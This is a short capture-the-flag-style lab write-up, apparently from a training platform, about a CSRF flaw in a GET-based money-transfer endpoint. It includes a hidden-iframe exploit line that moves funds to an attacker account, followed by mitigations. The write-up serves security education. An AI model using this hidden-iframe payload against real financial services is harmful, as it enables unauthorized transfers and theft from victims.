# CSRF - Financial Transaction Exploitation

## 🎯 Objective
Exploit Cross-Site Request Forgery to perform unauthorized financial transactions, demonstrating high-impact CSRF risks.

## 🔍 Vulnerability Analysis
- **Type:** Cross-Site Request Forgery (CSRF)
- **Endpoint:** `GET /index.php`
- **Parameters:** `transfer_amount`, `receiver`
- **Detection:** Financial transactions implemented via GET requests without security tokens
- **Impact:** Unauthorized fund transfers leading to direct financial loss

## 💥 Exploitation
```html
<!-- Hidden iframe on malicious site -->
<iframe src="http://live-starwoman.apac01.hackviser.space/index.php?transfer_amount=500&receiver=attacker" 
        style="display:none;"></iframe>
Result: Successfully transferred 500 units to attacker-controlled account and obtained transaction ID.

🛡️ Mitigation Strategies
Mandatory Anti-CSRF Tokens: Require cryptographically secure tokens for all transactions

Re-authentication: Require password confirmation for financial operations

Transaction Limits: Implement daily/transaction amount limits

Notification Systems: Alert users of all financial transactions via email/SMS

📊 Skills Demonstrated
High-Impact CSRF: Exploiting vulnerabilities with direct financial consequences

Stealth Techniques: Implementing invisible CSRF delivery mechanisms

Financial Security: Understanding transaction security requirements

Risk Assessment: Evaluating business impact of CSRF vulnerabilities

Conducted in controlled environment for educational purposes
